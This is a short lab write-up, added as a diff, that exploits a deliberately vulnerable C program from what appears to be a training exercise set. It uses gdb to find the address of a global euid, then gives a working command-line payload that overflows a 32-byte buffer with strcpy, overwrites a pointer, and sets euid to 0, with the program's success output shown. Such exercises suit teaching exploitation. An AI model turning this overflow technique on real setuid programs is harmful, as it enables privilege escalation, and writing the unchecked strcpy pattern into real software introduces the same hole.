@@ -1,0 +1,33 @@
+$ gdb -q ./rewrite-local-variable 
+Reading symbols from ./rewrite-local-variable...done.
+(gdb) b main
+Breakpoint 1 at 0x80484d8: file rewrite-local-variable.c, line 14.
+(gdb) r
+Starting program: /home/lain/cvuln/rewrite-local-variable/rewrite-local-variable 
+
+Breakpoint 1, main (argc=1, argv=0xbffff4b4) at rewrite-local-variable.c:14
+14	  int *age_ptr = &age;
+(gdb) p &euid
+$1 = (int *) 0x804a040 <euid>
+
+
+This is the portion of vulnerable code :
+  int age;
+  int *age_ptr = &age;
+  char name[32];
+
+  [...]
+
+  strcpy(name, argv[1]);
+  *age_ptr = atoi(argv[2]);
+
+We can overflow name to rewrite the age_ptr. Let's make point to the
+euid variable so we can control it via the second argument !
+
+$ ./rewrite-local-variable $(python -c 'print("A"*32+"\x40\xa0\x04\x08")') 0
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@ is -1208229888 years old
+Congratulations! This is the hidden string!
+
+Full buffer with 32 A and overflow it by passing the euid address. It will
+overwrite what is just up on the stack : the age_ptr. the second argument (0)
+is our new euid.
